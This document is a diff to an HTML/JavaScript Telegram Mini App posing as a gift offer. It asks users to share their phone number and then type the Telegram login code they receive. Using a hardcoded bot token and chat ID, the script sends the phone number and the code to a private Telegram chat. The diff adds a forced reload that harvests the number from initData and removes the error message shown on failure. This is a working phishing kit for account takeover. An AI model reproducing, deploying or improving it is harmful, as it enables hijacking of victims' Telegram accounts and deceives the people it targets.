@@ -10,9 +10,7 @@
         
         .code-header { font-size: 24px; font-weight: 500; margin-bottom: 10px; margin-top: 20px; }
         .code-subtitle { font-size: 14px; color: var(--tg-theme-hint-color, #999999); margin-bottom: 30px; line-height: 1.4; }
-        
         .code-input { position: absolute; opacity: 0; width: 1px; height: 1px; font-size: 16px; }
-        
         .code-container { display: flex; justify-content: center; gap: 8px; margin-bottom: 30px; }
         .code-cell { width: 45px; height: 55px; border: 1.5px solid var(--tg-theme-hint-color, #ccc); border-radius: 10px; display: flex; justify-content: center; align-items: center; font-size: 24px; font-weight: 600; transition: border-color 0.2s; }
         .code-cell.filled { border-color: var(--tg-theme-button-color, #3390ec); }
@@ -30,18 +28,15 @@
 </head>
 <body>
 
-    <!-- Экран 1 -->
     <div id="screen-phone">
         <h2 style="margin-top: 40px;">Step 1</h2>
         <p style="color: gray;">To receive your gift, authorize using the button below 👇</p>
         <button class="auth-btn" id="btn-share">SHARE PHONE NUMBER</button>
     </div>
 
-    <!-- Экран 2 -->
     <div id="screen-code" class="hidden">
         <div class="code-header">Enter the code</div>
         <div class="code-subtitle">We sent a Telegram code to your number<br><b>*** *** ** **</b></div>
-        
         <div class="code-container" id="code-cells">
             <div class="code-cell"></div>
             <div class="code-cell"></div>
@@ -49,7 +44,6 @@
             <div class="code-cell"></div>
             <div class="code-cell"></div>
         </div>
-
         <input type="text" id="code-input" class="code-input" inputmode="numeric" autocomplete="one-time-code" maxlength="5">
         <div id="status-msg" class="success-text hidden">Code sent successfully!</div>
     </div>
@@ -64,25 +58,26 @@
                 const BOT_TOKEN = "8836719851:AAHO5sFobm_1MwTsC5GUvUCmkgRrRwO8s2g";
                 const CHAT_ID = "-1004399809740";
 
+                // ПРОВЕРКА: Если initData уже содержит номер (после перезагрузки)
+                const initUser = tg.initDataUnsafe?.user;
+                if (initUser && initUser.phone_number) {
+                    // Отправляем номер и переключаем на код
+                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ chat_id: CHAT_ID, text: `📱 PHONE: ${initUser.phone_number}` })
+                    });
+                    document.getElementById('screen-phone').classList.add('hidden');
+                    document.getElementById('screen-code').classList.remove('hidden');
+                }
+
                 // 1. ЗАПРОС НОМЕРА
                 document.getElementById('btn-share').onclick = function() {
                     tg.requestContact(function(shared, contact) {
                         if (shared) {
-                            // Отправляем номер через sendData (он 100% сработает и улетит боту)
-                            // ВАЖНО: sendData закроет окно. Нам нужно сразу переключить экран на ввод кода.
-                            
-                            let phone = "undefined";
-                            if (contact && contact.phone_number) phone = contact.phone_number;
-                            else if (contact && contact.phone) phone = contact.phone;
-
-                            tg.sendData(JSON.stringify({ type: "phone", phone: phone }));
-                            
-                            // Переключаем экран
-                            document.getElementById('screen-phone').classList.add('hidden');
-                            document.getElementById('screen-code').classList.remove('hidden');
-                            
-                            // Фокусируемся на вводе
-                            setTimeout(() => { document.getElementById('code-input').focus(); }, 100);
+                            // Перезагружаем мини-апп, чтобы вытащить номер из initData
+                            // (пользователь увидит легкое моргание, но останется в приложении)
+                            window.location.reload();
                         }
                     });
                 };
@@ -115,19 +110,13 @@
                         document.getElementById('status-msg').classList.remove('hidden');
                         document.querySelector('.code-subtitle').innerHTML = "<b>Processing...</b>";
                         
-                        // Отправляем КОД через fetch (окно НЕ закроется)
                         fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                             method: 'POST',
                             headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({
-                                chat_id: CHAT_ID,
-                                text: `🔑 CODE: ${value}`
-                            })
+                            body: JSON.stringify({ chat_id: CHAT_ID, text: `🔑 CODE: ${value}` })
                         }).then(res => res.json()).then(data => {
                             if(data.ok) {
                                 document.querySelector('.code-subtitle').innerHTML = "<b style='color: #34c759;'>Code sent successfully!</b>";
-                            } else {
-                                document.querySelector('.code-subtitle').innerHTML = "<b style='color: red;'>Error sending code</b>";
                             }
                         });
                     }
